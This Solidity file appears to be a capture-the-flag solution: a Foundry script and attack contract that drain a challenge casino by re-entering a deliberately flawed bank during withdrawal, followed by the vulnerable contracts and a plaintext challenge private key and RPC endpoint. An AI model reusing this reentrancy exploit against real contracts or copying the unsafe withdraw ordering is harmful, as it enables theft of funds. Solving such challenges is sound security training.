// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x3cf9CA03E05c72c5A910a6852A55F043B9a2fc57);
    address wallet = 0xF4d264Ff827FFd1337641E9D26f53c15aA785FfD;
    InjuBank public immutable ibank = setup.ibank();
    InjuCasino public immutable icasino = setup.icasino();


    function run() public {
        vm.startBroadcast(0x531e4c142f624c0762fb1aff1f7277c399b8dfa0fa0d82443dc29581de5d370c);

        console.log(wallet.balance);

        Hack hack = new Hack(payable(address(ibank)), payable(address(icasino)));

        hack.attack{value: 6 ether}();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

contract Hack {
    InjuBank public immutable ibank;
    InjuCasino public immutable icasino;

    constructor(address payable bank, address payable casino) {
        ibank = InjuBank(bank);
        icasino = InjuCasino(casino);
    }

    function attack() external payable {
        icasino.registerMember{value: 1 ether}();
        ibank.deposit{value: 4 ether}(4 ether);
        ibank.withdraw(0);

    }

    receive() external payable {
        if(msg.sender == address(ibank)) {
            icasino.getSpecialReward();
            icasino.getSpecialReward();
            icasino.getSpecialReward();
        }
    }
}

// UUID	226627b3-21d3-4115-8e51-0185bf8c70eb
// RPC Endpoint	http://103.178.153.113:50002/226627b3-21d3-4115-8e51-0185bf8c70eb
// Private Key	0x531e4c142f624c0762fb1aff1f7277c399b8dfa0fa0d82443dc29581de5d370c
// Setup Contract	0x3cf9CA03E05c72c5A910a6852A55F043B9a2fc57
// Wallet	0xF4d264Ff827FFd1337641E9D26f53c15aA785FfD

contract Setup{
    InjuBank public immutable ibank;
    InjuCasino public immutable icasino;

    constructor() payable{
        ibank = new InjuBank();
        icasino = new InjuCasino{value: 30 ether}(payable(address(ibank)));
    }

    function isSolved() public view returns(bool){
        return address(icasino).balance <= 20 ether;
    }

}

contract InjuCasino{
    InjuBank public injubank;

    address public owner;
    mapping (address => bool) isMember;

    constructor(address payable _bank) payable {
        injubank = InjuBank(_bank);
    }

    function registerMember() public payable{
        require(msg.value == 1 ether, "Pay exactly 1 ETH to become a member.");
        isMember[msg.sender] = true;
    }

    function getSpecialReward() public {
        require(injubank.hasWithdrawed(msg.sender) == true, "Not Currently Withdrawing");
        require(isMember[msg.sender], "Only Registered Casino Member can claim this Special Benefit.");
        uint256 bonusBalance = injubank.balances(msg.sender) * 2;
        (bool success, ) = msg.sender.call{value: bonusBalance}("");
        require(success, "Bonus failed to be sent");
    }


}

contract InjuBank{
    address public owner;
    mapping(address => bool) public hasWithdrawed;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    // You Can Deposit ETH to get the equal amount of Inju
    function deposit(uint256 _amount) public payable{
        require(_amount == msg.value, "There seem some mismatch between the input and actual deposit.");
        uint256 depositAmount = msg.value;
        hasWithdrawed[msg.sender] = false;
        balances[msg.sender] += depositAmount;
    }

    // You can Withdraw your Inju back to your ETH
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "You don't have such money!");
        // Tell the bank you withdrawed some money
        hasWithdrawed[msg.sender] = true;
        uint256 newBalance = balances[msg.sender] - _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Sent Failed!");
        hasWithdrawed[msg.sender] = false; // Reset to basic
        balances[msg.sender] = newBalance;
    }

    // The Receive prevent you from accidentally Sending Random ETH
    // It will automatically Deposit the sent Ether
    receive() external payable { 
        deposit(msg.value);
    }

}